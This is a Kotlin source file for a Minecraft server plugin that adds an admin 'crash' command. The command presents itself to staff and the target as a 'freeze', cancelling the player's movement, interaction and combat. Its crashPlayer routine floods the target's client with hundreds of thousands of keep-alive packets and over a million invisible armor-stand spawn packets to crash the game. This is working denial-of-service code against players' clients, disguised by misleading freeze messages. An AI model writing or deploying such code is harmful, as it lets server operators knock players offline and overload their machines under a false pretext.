package cn.irina.thepitaddon.command.admin

import net.mizukilab.pit.util.chat.CC

import cn.irina.thepitaddon.Main
import dev.rollczi.litecommands.annotations.argument.Arg
import dev.rollczi.litecommands.annotations.command.Command
import dev.rollczi.litecommands.annotations.context.Context
import dev.rollczi.litecommands.annotations.execute.Execute
import dev.rollczi.litecommands.annotations.permission.Permission
import net.minecraft.server.v1_8_R3.EntityArmorStand
import net.minecraft.server.v1_8_R3.PacketPlayOutKeepAlive
import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntityLiving
import org.bukkit.Bukkit
import org.bukkit.command.CommandSender
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import org.bukkit.event.entity.EntityDamageByEntityEvent
import org.bukkit.event.player.PlayerInteractEvent
import org.bukkit.event.player.PlayerMoveEvent
import org.bukkit.event.player.PlayerQuitEvent
import org.bukkit.scheduler.BukkitRunnable

@Command(name = "crash")
@Permission("pit.admin")
class AdminCrashClient : Listener {
    @Execute
    fun freezeClient(@Context sender: CommandSender, @Arg target: Player) {
        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
            crashPlayer(target)
        }
        freezePlayers.add(target)
        sender.sendMessage(CC.translate("$PREFIX&7你冻结了 &e" + target.displayName))
    }

    @EventHandler
    fun onQuit(event: PlayerQuitEvent) {
        val player = event.player

        if (!freezePlayers.contains(player)) return
        freezePlayers.remove(player)
    }


    @EventHandler(priority = EventPriority.LOWEST)
    fun onInteract(event: PlayerInteractEvent) {
        val player = event.player

        if (!freezePlayers.contains(player)) return
        event.isCancelled = true
        player.sendMessage(CC.translate("$PREFIX&c您已被冻结! 请将此界面截图发送至任意客服或管理!"))
    }

    @EventHandler(priority = EventPriority.LOWEST)
    fun onAttack(event: EntityDamageByEntityEvent) {
        if (event.damager !is Player) return
        val attacker = event.damager as Player

        if (!freezePlayers.contains(attacker)) return
        event.isCancelled = true
        attacker.sendMessage(CC.translate("$PREFIX&c您已被冻结! 请将此界面截图发送至任意客服或管理!"))
    }

    @EventHandler(priority = EventPriority.LOWEST)
    fun onMove(event: PlayerMoveEvent) {
        val player = event.player

        if (!freezePlayers.contains(player)) return
        event.isCancelled = true
        player.sendMessage(CC.translate("$PREFIX&c您已被冻结! 请将此界面截图发送至任意客服或管理!"))
    }

    @EventHandler(priority = EventPriority.LOWEST)
    fun onDamage(event: EntityDamageByEntityEvent) {
        if (event.entity !is Player) return
        val victim = event.entity as Player

        if (!freezePlayers.contains(victim)) return
        event.isCancelled = true
        event.damager.sendMessage(CC.translate("$PREFIX&c该玩家正处于冻结状态!"))
    }

    private fun crashPlayer(player: Player) {
        Thread {
            val connection = (player as CraftPlayer).handle.playerConnection
            for (i in 0..149999) {
                val keepAlivePacket = PacketPlayOutKeepAlive(i)
                connection.sendPacket(keepAlivePacket)
            }
            object : BukkitRunnable() {
                var index: Int = 0
                override fun run() {
                    if (index >= 7) {
                        this.cancel()
                        return
                    }
                    for (i in 0..199999) {
                        val armorStand = EntityArmorStand(player.handle.getWorld())
                        armorStand.setLocation(
                            player.getLocation().x,
                            player.getLocation().y,
                            player.getLocation().z,
                            player.getLocation().yaw,
                            player.getLocation().pitch
                        )
                        armorStand.isInvisible = true
                        val entityPacket = PacketPlayOutSpawnEntityLiving(armorStand)
                        connection.sendPacket(entityPacket)
                    }
                    index++
                }
            }.runTaskTimerAsynchronously(Main.instance, 0, 12 * 20L)
        }.start()
    }

    companion object {
        private val freezePlayers: MutableList<Player> = ArrayList()
        private val PREFIX = Main.instance.PREFIX
    }
}
